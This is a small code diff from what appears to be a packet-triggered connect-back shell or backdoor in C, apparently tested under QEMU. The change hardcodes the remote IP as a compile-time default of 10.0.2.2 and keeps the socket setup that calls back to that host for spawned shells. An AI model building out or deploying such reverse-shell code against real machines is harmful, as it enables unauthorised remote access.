@@ -11,9 +11,11 @@
 
 #include "interface.h"
 
-int main(int argc, char *argv[]) {
-    const char *remote_ip_str = (argc >= 2) ? argv[1] : "10.0.2.2";
+#ifndef DEFAULT_REMOTE_IP
+#define DEFAULT_REMOTE_IP "10.0.2.2"
+#endif
 
+int main(void) {
     /* Prevent terminated shell children from becoming zombies */
     signal(SIGCHLD, SIG_IGN);
 
@@ -51,7 +53,7 @@ int main(int argc, char *argv[]) {
 
             /* If trigger came from QEMU host forwarder (0.0.0.0), resolve to host gateway */
             if (remote_ip.s_addr == INADDR_ANY) {
-                inet_pton(AF_INET, remote_ip_str, &remote_ip);
+                        inet_pton(AF_INET, DEFAULT_REMOTE_IP, &remote_ip);
             }
 
             int sock = socket(AF_INET, SOCK_STREAM, 0);
